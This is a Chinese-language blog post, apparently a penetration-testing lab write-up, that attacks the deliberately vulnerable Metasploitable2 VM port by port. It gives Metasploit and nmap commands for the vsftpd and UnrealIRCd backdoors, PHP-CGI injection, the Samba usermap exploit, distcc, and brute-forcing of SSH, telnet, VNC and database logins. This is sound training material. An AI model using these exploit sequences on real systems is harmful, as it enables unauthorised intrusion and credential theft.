{"title":"Metasploitable2 Sploit Practice","slug":"metasploitable_port","date":"2018-04-27T15:57:31.329Z","updated":"2018-04-27T16:44:29.345Z","comments":true,"path":"api/articles/metasploitable_port.json","photos":[],"link":"","excerpt":null,"covers":["./images/metasploitable2_port/001.jpg","./images/metasploitable2_port/01.png","./images/metasploitable2_port/02_1.png","./images/metasploitable2_port/02.png","./images/metasploitable2_port/04.png","./images/metasploitable2_port/06.png","./images/metasploitable2_port/07.png","./images/metasploitable2_port/08.png","./images/metasploitable2_port/09.png","./images/metasploitable2_port/10.png","./images/metasploitable2_port/11.png","./images/metasploitable2_port/12.png","./images/metasploitable2_port/13.png","./images/metasploitable2_port/14.png","./images/metasploitable2_port/15.png","./images/metasploitable2_port/16.png","./images/metasploitable2_port/19.png","./images/metasploitable2_port/17.png","./images/metasploitable2_port/18.png","./images/metasploitable2_port/20.png","./images/metasploitable2_port/21.png","./images/metasploitable2_port/33.png","./images/metasploitable2_port/06.png","./images/metasploitable2_port/31.png","./images/metasploitable2_port/32.png","./images/metasploitable2_port/12.png","./images/metasploitable2_port/22.png","./images/metasploitable2_port/23.png","./images/metasploitable2_port/24.png","./images/metasploitable2_port/25.png","./images/metasploitable2_port/26.png","./images/metasploitable2_port/27.png","./images/metasploitable2_port/28.png","./images/metasploitable2_port/29.png","./images/metasploitable2_port/30.png","./images/metasploitable2_port/34.png","./images/metasploitable2_port/35.png","./images/metasploitable2_port/36.png"],"content":"<a id=\"more\"></a>\n<p><img src=\"./images/metasploitable2_port/001.jpg\" alt=\"\"></p>\n<h3 id=\"Metasploitable2\"><a href=\"#Metasploitable2\" class=\"headerlink\" title=\"Metasploitable2\"></a>Metasploitable2</h3><p>一个漏洞演练系统，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统。下载地址：<a href=\"https://sourceforge.net/projects/metasploitable/files/Metasploitable2/\" target=\"_blank\" rel=\"noopener\">传送门</a>当然也发布了一个Metasploitable3增加了一个CTF大赛。</p>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><p>kali(主机)：192.168.56.1<br>metasploitable(目标靶机)：192.168.56.99</p>\n<h3 id=\"start\"><a href=\"#start\" class=\"headerlink\" title=\"start\"></a>start</h3><p>首先使用nmap进行端口扫描，扫描结果如下：</p>\n<p><img src=\"./images/metasploitable2_port/01.png\" alt=\"\"></p>\n<p>打开msf,在终端输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># msfconsole</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"21端口-ftp服务器\"><a href=\"#21端口-ftp服务器\" class=\"headerlink\" title=\"21端口:ftp服务器\"></a>21端口:ftp服务器</h4><p>首先看下是什么搭建的，再看一下可不可能存在中间件漏洞，其次尝试爆破，看见有一Vsftpd 2.3.4版本可能存在一个后门利用脚本扫描发现可利用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># nmap –script ftp-vsftpd-backdoor –p 21 192.168.56.99</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/02_1.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; search vsftpd</span><br><span class=\"line\"></span><br><span class=\"line\">msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor </span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p>输入whoami测试</p>\n<p><img src=\"./images/metasploitable2_port/02.png\" alt=\"\"><br><img src=\"./images/metasploitable2_port/03.png\" alt=\"\"></p>\n<h4 id=\"22端口-ssh\"><a href=\"#22端口-ssh\" class=\"headerlink\" title=\"22端口:ssh\"></a>22端口:ssh</h4><p>弱口令爆破(你需要准备一个弱字典)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class=\"built_in\">set</span> username root</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class=\"built_in\">set</span> threads 10</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class=\"built_in\">set</span> pass_file </span><br><span class=\"line\">/root/password.txt</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class=\"built_in\">set</span> stop_on_success  ture</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; exploit</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; sessions</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/04.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/06.png\" alt=\"\"></p>\n<p>终端输入:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># ssh 192.168.56.99</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/07.png\" alt=\"\"></p>\n<h4 id=\"23端口-telnet远程登录\"><a href=\"#23端口-telnet远程登录\" class=\"headerlink\" title=\"23端口:telnet远程登录\"></a>23端口:telnet远程登录</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/telnet/telnet_login </span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; <span class=\"built_in\">set</span> username msfadmin</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; <span class=\"built_in\">set</span> threads 10</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; <span class=\"built_in\">set</span> pass_file /root/password.txt</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; <span class=\"built_in\">set</span> stop_on_success <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; exploit</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; sessions</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(scanner/telnet/telnet_login) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/08.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/09.png\" alt=\"\"></p>\n<p>得知账号密码后也可以终端输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># telnet 192.168.56.99</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/10.png\" alt=\"\"></p>\n<p>另一种方式用amap端口扫描(可为后面1524做铺垫)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># amap -bqv 192.168.56.99 1-65535</span></span><br></pre></td></tr></table></figure>\n<p>发现利用漏洞</p>\n<p><img src=\"./images/metasploitable2_port/11.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># telnet 192.168.56.99 1524</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/12.png\" alt=\"\"></p>\n<h4 id=\"80-Web\"><a href=\"#80-Web\" class=\"headerlink\" title=\"80:Web\"></a>80:Web</h4><p>测试web的方式进行利用，利用其中一个(phpinfo.php)</p>\n<p>在主机打开浏览器输入：192.168.56.99/phpinfo.php</p>\n<p><img src=\"./images/metasploitable2_port/13.png\" alt=\"\"></p>\n<p>由图可知泄露了服务器信息，而且看到server API还是CGI方式运行的，想到了有个严重的漏洞- CGI参数注入</p>\n<p>输入参数试试：192.168.56.99/phpinfo.php?-s</p>\n<p><img src=\"./images/metasploitable2_port/14.png\" alt=\"\"></p>\n<p>好，开始利用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use exploit/multi/http/php_cgi_arg_injection</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/http/php_cgi_arg_injection) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/http/php_cgi_arg_injection) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/http/php_cgi_arg_injection) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p>输入shell(灵活使用shell命令，可shell -h查看)—whoami</p>\n<p><img src=\"./images/metasploitable2_port/15.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/16.png\" alt=\"\"></p>\n<h4 id=\"139端口，445端口\"><a href=\"#139端口，445端口\" class=\"headerlink\" title=\"139端口，445端口\"></a>139端口，445端口</h4><p>smb类型的，共享服务,进行枚举</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/smb/smb_enumshares</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/smb/smb_enumshares) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/smb/smb_enumshares) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/smb/smb_enumshares) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/19.png\" alt=\"\"></p>\n<p>利用脚本枚举</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># nmap –script smb-enum-users.nse –p 139 192.68.56.99</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/17.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/18.png\" alt=\"\"></p>\n<p>发现大量用户存在而且用户名和密码一致</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/smb/smb_enumshares) &gt; use auxiliary/admin/smb/samba_symlink_traversal</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/admin/smb/samba_symlink_traversal) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/admin/smb/samba_symlink_traversal) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/admin/smb/samba_symlink_traversal) &gt; <span class=\"built_in\">set</span> smbshare tmp</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/admin/smb/samba_symlink_traversal) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/20.png\" alt=\"\"></p>\n<p>打开终端输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># smbclient //192.168.56.99/tmp/</span></span><br><span class=\"line\"><span class=\"comment\">#会提示输入密码，找到脚本扫描的tmp密码</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/21.png\" alt=\"\"></p>\n<p>如果利用其它文件类同</p>\n<p>另一种利用samba 3.0漏洞</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use exploit/multi/samba/usermap_script </span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/samba/usermap_script) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/samba/usermap_script) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(multi/samba/usermap_script) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p>输入whoami测试</p>\n<p><img src=\"./images/metasploitable2_port/33.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/06.png\" alt=\"\"></p>\n<h4 id=\"1099端口\"><a href=\"#1099端口\" class=\"headerlink\" title=\"1099端口\"></a>1099端口</h4><p>distcc程序漏洞-ingrelock</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use exploit/unix/misc/distcc_exec </span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/misc/distcc_exec) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/misc/distcc_exec) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/misc/distcc_exec) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/31.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/32.png\" alt=\"\"></p>\n<h4 id=\"1524端口\"><a href=\"#1524端口\" class=\"headerlink\" title=\"1524端口\"></a>1524端口</h4><p>msfable的一个后门，用telnet直接连之即可</p>\n<p><img src=\"./images/metasploitable2_port/12.png\" alt=\"\"></p>\n<h4 id=\"3306端口-mysql端口\"><a href=\"#3306端口-mysql端口\" class=\"headerlink\" title=\"3306端口:mysql端口\"></a>3306端口:mysql端口</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/mysql/mysql_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/mysql/mysql_login) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/mysql/mysql_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/mysql/mysql_login) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/22.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/23.png\" alt=\"\"></p>\n<p>测试看见可以允许远程连接</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># mysql -h 192.168.56.99</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/24.png\" alt=\"\"></p>\n<h4 id=\"5432-端口\"><a href=\"#5432-端口\" class=\"headerlink\" title=\"5432 端口\"></a>5432 端口</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf &gt; use auxiliary/scanner/postgres/postgres_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/postgres/postgres_login) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/postgres/postgres_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/postgres/postgres_login) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/25.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/26.png\" alt=\"\"></p>\n<p>会发现得到帐号密码</p>\n<h4 id=\"5900端口\"><a href=\"#5900端口\" class=\"headerlink\" title=\"5900端口\"></a>5900端口</h4><p>vnc服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/vnc/vnc_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/vnc/vnc_login) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/vnc/vnc_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/vnc/vnc_login) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/27.png\" alt=\"\"></p>\n<p>得到密码为password后我们使用vncview进行连接即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@Crazy:~<span class=\"comment\"># vncviewer 192.168.56.99</span></span><br><span class=\"line\"><span class=\"comment\">#输入密码(password)</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/28.png\" alt=\"\"></p>\n<h4 id=\"6667端口：IRC服务\"><a href=\"#6667端口：IRC服务\" class=\"headerlink\" title=\"6667端口：IRC服务\"></a>6667端口：IRC服务</h4><p>这个版本存在后门漏洞</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show options</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class=\"built_in\">set</span> rhost 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/29.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/30.png\" alt=\"\"></p>\n<h4 id=\"8180端口-Apache-Tomcat弱口令\"><a href=\"#8180端口-Apache-Tomcat弱口令\" class=\"headerlink\" title=\"8180端口:Apache Tomcat弱口令\"></a>8180端口:Apache Tomcat弱口令</h4><p>在测试139枚举有存在tomcat账户合密码，也可以利用弱密码爆破</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">msf &gt; use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/http/tomcat_mgr_login) &gt; show optinos</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/http/tomcat_mgr_login) &gt; <span class=\"built_in\">set</span> rhosts 192.168.56.99</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/http/tomcat_mgr_login) &gt;  <span class=\"built_in\">set</span> rport 8180</span><br><span class=\"line\"></span><br><span class=\"line\">msf auxiliary(/scanner/http/tomcat_mgr_login) &gt; exploit</span><br></pre></td></tr></table></figure>\n<p><img src=\"./images/metasploitable2_port/34.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/35.png\" alt=\"\"></p>\n<p><img src=\"./images/metasploitable2_port/36.png\" alt=\"\"></p>\n<p>得出账号密码</p>\n<p>再次利用use exploit/multi/http/tomcat_mgr_deploy和use exploit/multi/http/tomcat_mgr_upload模块时，出现了错误总是不能建立会话，暂未找到原因。</p>\n<h3 id=\"待续……\"><a href=\"#待续……\" class=\"headerlink\" title=\"待续……\"></a>待续……</h3>","categories":[],"tags":[{"name":"渗透,msf","slug":"渗透-msf","count":1,"path":"api/tags/渗透-msf.json"}]}